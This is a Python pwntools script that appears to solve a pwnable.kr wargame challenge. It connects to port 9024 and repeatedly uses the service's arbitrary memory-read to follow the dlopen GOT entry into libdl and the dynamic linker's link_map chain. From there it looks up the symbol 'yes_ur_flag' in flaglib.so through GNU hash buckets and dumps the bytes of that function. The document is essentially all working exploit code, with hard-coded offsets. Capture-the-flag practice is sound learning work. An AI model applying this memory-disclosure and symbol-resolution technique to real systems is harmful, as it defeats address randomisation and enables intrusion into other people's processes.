from pwn import * 
import binascii


conn = None
verbose = True
HOST = 'pwnable.kr'

def init():
    global conn
    conn = remote(HOST, 9024)
    recv(binary=False)
    recv(binary=False)


def fini():
    global conn
    conn.close()
    conn = None


def bytes_to_int(data):
    barray = bytearray(reversed(data))
    return int(binascii.hexlify(barray), 16)


def recv(binary=False):
    received = conn.recv()
    if verbose:
        if binary:
            print('Server:', received)
        # else:
        #     print('Server:', received.decode())
    return received

def send(data):
    conn.send(data)
    if verbose:
        print('Client:', data.decode())



def query(addr):
    send(hex(addr).encode() + b'\n')
    data = recv(binary=True)
    recv(binary=False)  # Next prompt
    return data


def deref(addr, width=8):
    value_bytes = query(addr)[:width]
    return bytes_to_int(value_bytes)


def dl_new_hash(data):
	h = 5381
	for c in data:
		h = h * 33 + c
	return h & 0xffffffff


DLOPEN_AT_PYTHON_GOT = 0x8DE800 
DLOPEN_OFFSET_AT_LIBDL = 0xF70
RTDL_GLOBAL_PTR_OFFSET_AT_LIBDL = 0x202FF0
INTERP_MAP_OFFSET_FROM_RTDL_GLOBAL = 2456
FLAGLIB_SO_OFFSET_FROM_INTERP = 5 

def main():
    init()

    # Full algorithm in `Solution.txt`

    dlopen_ptr = DLOPEN_AT_PYTHON_GOT
    dlopen = deref(dlopen_ptr)
    libdl = dlopen - DLOPEN_OFFSET_AT_LIBDL
    _rtdl_global_ptr = libdl + RTDL_GLOBAL_PTR_OFFSET_AT_LIBDL
    _rtdl_global = deref(_rtdl_global_ptr)
    interp_map = _rtdl_global + INTERP_MAP_OFFSET_FROM_RTDL_GLOBAL

    curr_map = interp_map
    for i in range(FLAGLIB_SO_OFFSET_FROM_INTERP):
        curr_map = deref(curr_map + 0x18)
    flaglib_map = curr_map

    l_gnu_buckets = deref(flaglib_map + 768)
    l_nbuckets = deref(flaglib_map + 748, width=4)
    our_hash = dl_new_hash(b'yes_ur_flag')
    bucket = deref(l_gnu_buckets + 4 * (our_hash % l_nbuckets), 4)
    
    symidx = bucket + 1

    libflag_symtab_dyn = deref(flaglib_map + 112)
    symtab =  deref(libflag_symtab_dyn + 8)
    sym_st_value = deref(symtab + 0x18 * symidx + 8)
    flaglib_l_addr = deref(flaglib_map + 0x0)
    flag_function = flaglib_l_addr + sym_st_value

    flag_function_data = query(flag_function) + query(flag_function + 32) + query(flag_function + 64) + query(flag_function + 96)
    
    print(f'`flaglib.so` load address: {hex(flaglib_l_addr)}')
    print(f'`yes_ur_flag` at: {hex(flag_function)}')
    print(f'`Data:')
    print(flag_function_data)

    fini()


if __name__ == '__main__':
    main()
    pass